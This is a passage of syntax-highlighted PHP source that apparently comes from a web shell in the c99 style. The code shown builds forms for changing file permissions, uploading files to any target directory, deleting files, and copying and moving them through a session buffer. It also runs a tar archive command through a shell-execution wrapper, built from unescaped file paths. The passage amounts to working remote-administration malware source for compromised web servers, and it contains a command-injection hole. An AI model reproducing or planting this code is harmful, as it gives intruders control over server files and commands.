class="o">.</span><span class="p">(</span><span class="nv">$perms</span><span class="p">[</span><span class="s2">&quot;o&quot;</span><span class="p">][</span><span class="s2">&quot;r&quot;</span><span class="p">]</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt;&amp;nbsp;Read&amp;lt;br&amp;gt;&amp;lt;input type=checkbox name=chmod_o[w] value=1&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$perms</span><span class="p">[</span><span class="s2">&quot;o&quot;</span><span class="p">][</span><span class="s2">&quot;w&quot;</span><span class="p">]</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt;&amp;nbsp;Write&amp;lt;br&amp;gt;&amp;lt;input type=checkbox NAME=chmod_o[x] value=1&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$perms</span><span class="p">[</span><span class="s2">&quot;o&quot;</span><span class="p">][</span><span class="s2">&quot;x&quot;</span><span class="p">]</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt;eXecute&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Group&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=checkbox NAME=chmod_g[r] value=1&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$perms</span><span class="p">[</span><span class="s2">&quot;g&quot;</span><span class="p">][</span><span class="s2">&quot;r&quot;</span><span class="p">]</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt;&amp;nbsp;Read&amp;lt;br&amp;gt;&amp;lt;input type=checkbox NAME=chmod_g[w] value=1&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$perms</span><span class="p">[</span><span class="s2">&quot;g&quot;</span><span class="p">][</span><span class="s2">&quot;w&quot;</span><span class="p">]</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt;&amp;nbsp;Write&amp;lt;br&amp;gt;&amp;lt;input type=checkbox NAME=chmod_g[x] value=1&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$perms</span><span class="p">[</span><span class="s2">&quot;g&quot;</span><span class="p">][</span><span class="s2">&quot;x&quot;</span><span class="p">]</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt;eXecute&amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;World&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=checkbox NAME=chmod_w[r] value=1&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$perms</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">][</span><span class="s2">&quot;r&quot;</span><span class="p">]</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt;&amp;nbsp;Read&amp;lt;br&amp;gt;&amp;lt;input type=checkbox NAME=chmod_w[w] value=1&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$perms</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">][</span><span class="s2">&quot;w&quot;</span><span class="p">]</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt;&amp;nbsp;Write&amp;lt;br&amp;gt;&amp;lt;input type=checkbox NAME=chmod_w[x] value=1&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$perms</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">][</span><span class="s2">&quot;x&quot;</span><span class="p">]</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt;eXecute&amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=submit name=chmod_submit value=</span><span class="se">\&quot;</span><span class="s2">Save</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&amp;lt;/form&amp;gt;&quot;</span><span class="p">;</span>
        <span class="p">}</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;upload&quot;</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$uploadmess</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
      <span class="nv">$uploadpath</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$uploadpath</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$uploadpath</span><span class="p">))</span> <span class="p">{</span><span class="nv">$uploadpath</span> <span class="o">=</span> <span class="nv">$d</span><span class="p">;}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$uploadpath</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$uploadpath</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$submit</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">global</span> <span class="nv">$_FILES</span><span class="p">;</span>
        <span class="nv">$uploadfile</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&quot;uploadfile&quot;</span><span class="p">];</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$uploadfile</span><span class="p">[</span><span class="s2">&quot;tmp_name&quot;</span><span class="p">]))</span> <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$uploadfilename</span><span class="p">))</span> <span class="p">{</span><span class="nv">$destin</span> <span class="o">=</span> <span class="nv">$uploadfile</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];}</span>
          <span class="k">else</span> <span class="p">{</span><span class="nv">$destin</span> <span class="o">=</span> <span class="nv">$userfilename</span><span class="p">;}</span>
          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$uploadfile</span><span class="p">[</span><span class="s2">&quot;tmp_name&quot;</span><span class="p">],</span><span class="nv">$uploadpath</span><span class="o">.</span><span class="nv">$destin</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$uploadmess</span> <span class="o">.=</span> <span class="s2">&quot;Error uploading file &quot;</span><span class="o">.</span><span class="nv">$uploadfile</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; (can&#39;t copy </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$uploadfile</span><span class="p">[</span><span class="s2">&quot;tmp_name&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> to </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$uploadpath</span><span class="o">.</span><span class="nv">$destin</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">!&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
          <span class="p">}</span>
          <span class="k">else</span> <span class="p">{</span> <span class="nv">$uploadmess</span> <span class="o">.=</span> <span class="s2">&quot;File uploaded successfully!&amp;lt;br&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$uploadpath</span><span class="o">.</span><span class="nv">$destin</span><span class="p">;</span> <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;No file to upload!&quot;</span><span class="p">;</span> <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$miniform</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$uploadmess</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span>
        <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;table&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td colspan=2 class=barheader&amp;gt;&quot;</span><span class="o">.</span>
             <span class="s2">&quot;.: File Upload :.&amp;lt;/td&amp;gt;&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;td colspan=2&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$uploadmess</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;form enctype=</span><span class="se">\&quot;</span><span class="s2">multipart/form-data</span><span class="se">\&quot;</span><span class="s2"> action=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=upload&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> method=POST&amp;gt;&quot;</span><span class="o">.</span>
             <span class="s2">&quot;From Your Computer:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input name=</span><span class="se">\&quot;</span><span class="s2">uploadfile</span><span class="se">\&quot;</span><span class="s2"> type=</span><span class="se">\&quot;</span><span class="s2">file</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;From URL:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input name=</span><span class="se">\&quot;</span><span class="s2">uploadurl</span><span class="se">\&quot;</span><span class="s2"> type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$uploadurl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> size=</span><span class="se">\&quot;</span><span class="s2">70</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;Target Directory:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input name=</span><span class="se">\&quot;</span><span class="s2">uploadpath</span><span class="se">\&quot;</span><span class="s2"> size=</span><span class="se">\&quot;</span><span class="s2">70</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$dispd</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;Target File Name:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input name=uploadfilename size=25&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=checkbox name=uploadautoname value=1 id=df4&amp;gt; Convert file name to lowercase&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=submit name=submit value=</span><span class="se">\&quot;</span><span class="s2">Upload</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&quot;</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;delete&quot;</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$delerr</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
      <span class="k">foreach</span> <span class="p">(</span><span class="nv">$actbox</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$result</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span>
        <span class="nv">$result</span> <span class="o">=</span> <span class="nx">fs_rmobj</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$delerr</span> <span class="o">.=</span> <span class="s2">&quot;Can&#39;t delete &quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$delerr</span><span class="p">))</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Error deleting:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$delerr</span><span class="p">;</span> <span class="p">}</span>
      <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$usefsbuff</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">((</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;paste&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;copy&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;cut&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;unselect&quot;</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Sorry, buffer is disabled. For enable, set directive </span><span class="se">\&quot;\$</span><span class="s2">usefsbuff</span><span class="se">\&quot;</span><span class="s2"> as TRUE.&amp;lt;/center&amp;gt;&quot;</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;copy&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$err</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">],</span><span class="nv">$actbox</span><span class="p">);</span> <span class="nx">tp_sess_put</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">);</span> <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span> <span class="p">}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;cut&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">],</span><span class="nv">$actbox</span><span class="p">);</span> <span class="nx">tp_sess_put</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">);</span> <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;unselect&quot;</span><span class="p">)</span> <span class="p">{</span><span class="k">foreach</span> <span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span><span class="nv">$actbox</span><span class="p">))</span> <span class="p">{</span><span class="nb">unset</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]);}}</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span><span class="nv">$actbox</span><span class="p">))</span> <span class="p">{</span><span class="nb">unset</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]);}}</span> <span class="nx">tp_sess_put</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">);</span> <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;}</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$actemptybuff</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span> <span class="nx">tp_sess_put</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">);}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nv">$actpastebuff</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$psterr</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
        <span class="k">foreach</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
          <span class="nv">$to</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">.</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">fs_copy_obj</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span><span class="nv">$to</span><span class="p">))</span> <span class="p">{</span><span class="nv">$psterr</span> <span class="o">.=</span> <span class="s2">&quot;Can&#39;t copy &quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot; to &quot;</span><span class="o">.</span><span class="nv">$to</span><span class="o">.</span><span class="s2">&quot;!&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$copy_unset</span><span class="p">)</span> <span class="p">{</span><span class="nb">unset</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]);}</span>
        <span class="p">}</span>
        <span class="k">foreach</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
          <span class="nv">$to</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">.</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">fs_move_obj</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span><span class="nv">$to</span><span class="p">))</span> <span class="p">{</span><span class="nv">$psterr</span> <span class="o">.=</span> <span class="s2">&quot;Can&#39;t move &quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot; to &quot;</span><span class="o">.</span><span class="nv">$to</span><span class="o">.</span><span class="s2">&quot;!&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
          <span class="nb">unset</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]);</span>
        <span class="p">}</span>
        <span class="nx">tp_sess_put</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$psterr</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Pasting with errors:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$psterr</span><span class="p">;}</span>
        <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nv">$actarcbuff</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$arcerr</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$actarcbuff_path</span><span class="p">,</span><span class="o">-</span><span class="mi">7</span><span class="p">,</span><span class="mi">7</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;.tar.gz&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$ext</span> <span class="o">=</span> <span class="s2">&quot;.tar.gz&quot;</span><span class="p">;}</span>
        <span class="k">else</span> <span class="p">{</span><span class="nv">$ext</span> <span class="o">=</span> <span class="s2">&quot;.tar.gz&quot;</span><span class="p">;}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$ext</span> <span class="o">==</span> <span class="s2">&quot;.tar.gz&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$cmdline</span> <span class="o">=</span> <span class="s2">&quot;tar cfzv&quot;</span><span class="p">;}</span>
        <span class="nv">$cmdline</span> <span class="o">.=</span> <span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nv">$actarcbuff_path</span><span class="p">;</span>
        <span class="nv">$objects</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">],</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]);</span>
        <span class="k">foreach</span><span class="p">(</span><span class="nv">$objects</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
          <span class="nv">$v</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$v</span><span class="p">);</span>
          <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span> <span class="o">==</span> <span class="nv">$d</span><span class="p">)</span> <span class="p">{</span><span class="nv">$v</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$v</span><span class="p">);}</span>
          <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$v</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
            <span class="nv">$v</span> <span class="o">.=</span> <span class="s2">&quot;*&quot;</span><span class="p">;</span>
          <span class="p">}</span>
          <span class="nv">$cmdline</span> <span class="o">.=</span> <span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nv">$v</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">);</span>
        <span class="nb">chdir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
        <span class="nv">$ret</span> <span class="o">=</span> <span class="nx">tpexec</span><span class="p">(</span><span class="nv">$cmdline</span><span class="p">);</span>
        <span class="nb">chdir</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$ret</span><span class="p">))</span> <span class="p">{</span><span class="nv">$arcerr</span> <span class="o">.=</span> <span class="s2">&quot;Can&#39;t call archivator (&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nx">str2mini</span><span class="p">(</span><span class="nv">$cmdline</span><span class="p">,</span><span class="mi">60</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;)!&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
        <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);</span>
        <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$copy_unset</span><span class="p">)</span> <span class="p">{</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nb">unset</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]);}}</span>
        <span class="k">foreach</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
